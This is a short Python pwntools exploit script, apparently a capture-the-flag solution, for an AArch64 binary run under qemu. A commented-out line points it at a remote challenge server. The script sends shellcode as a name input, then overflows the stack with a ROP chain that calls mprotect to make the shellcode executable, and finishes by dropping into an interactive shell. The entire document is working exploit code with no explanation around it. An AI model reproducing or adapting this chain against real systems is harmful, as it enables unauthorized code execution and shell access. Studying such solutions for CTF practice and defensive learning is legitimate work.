from pwn import *

p = process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu','./pwn'])
#p = remote('106.75.126.171',33865)
#p = remote('127.0.0.1',1212)
context.log_level = 'debug'
context(arch = 'aarch64')
elf = ELF('pwn')

print hex(elf.got['mprotect'])
p.recvuntil('Name:')
payload = p64(0x400600) + asm(shellcraft.aarch64.linux.sh())
#payload1 = 'A'*(0x200 - len(payload)) + payload
print len(payload)
p.send(payload)

sleep(1)
payload2 = 'A'*0x48 + p64(0x4008CC) + p64(0x0) + p64(0x4008AC) + p64(0x0)
payload2 += p64(0x1) + p64(0x411068) + p64(0x7) + p64(0x1000)
payload2 += p64(0x411048) + p64(0x0) + p64(0x411070)
#pause()
#gdb.attach(p)
p.send(payload2)

p.interactive()
